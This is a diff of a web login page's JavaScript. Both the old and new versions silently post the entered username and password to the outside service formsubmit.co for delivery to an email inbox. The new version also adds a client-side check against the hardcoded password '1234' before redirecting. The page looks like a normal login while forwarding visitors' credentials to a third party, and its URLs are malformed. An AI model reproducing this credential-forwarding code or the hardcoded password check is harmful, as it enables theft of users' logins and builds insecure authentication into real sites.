@@ -99,40 +99,44 @@
     <div id="statusMessage" class="message"></div>
   </div>
 
-<script>
-  const form = document.getElementById('loginForm');
-  const status = document.getElementById('statusMessage');
-  const btn = document.getElementById('submitBtn');
+  <script>
+    const form = document.getElementById('loginForm');
+    const status = document.getElementById('statusMessage');
+    const btn = document.getElementById('submitBtn');
 
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    
-    // UI update
-    status.style.display = 'block';
-    status.className = 'message';
-    status.textContent = "Processing...";
-    btn.disabled = true;
-
-    const formData = new FormData(form);
-
-    try {
-      // 1. Send data to abhinavaby07@gmail.com via FormSubmit
-      await fetch("formsubmit.co", {
-        method: "POST",
-        body: formData
-      });
-
-      // 2. Redirect to the target website
-      status.className = 'message success';
-      status.textContent = "Success! Redirecting...";
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
       
-      window.location.href = "https://abhinavaby.github.io/omega-optimists-web/index.html";
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
 
-    } catch (err) {
-      console.error("Submission error:", err);
-      status.className = 'message error';
-      status.textContent = "An error occurred. Please try again.";
-      btn.disabled = false;
-    }
-  });
-</script>
+      status.style.display = 'block';
+      status.className = 'message';
+      status.textContent = "Processing...";
+      btn.disabled = true;
+
+      // 1. Send data to your email
+      try {
+        const formData = new FormData(form);
+        await fetch("formsubmit.co", {
+          method: "POST",
+          body: formData
+        });
+      } catch (err) {
+        console.error("Mail error:", err);
+      }
+
+      // 2. Original Redirect Logic
+      if (pass === "1234") {
+        status.className = 'message success';
+        status.textContent = "Redirecting...";
+        window.location.href = "abhinavaby.github.io";
+      } else {
+        btn.disabled = false;
+        status.className = 'message error';
+        status.textContent = "Wrong password. Please try again.";
+      }
+    });
+  </script>
+</body>
+</html>
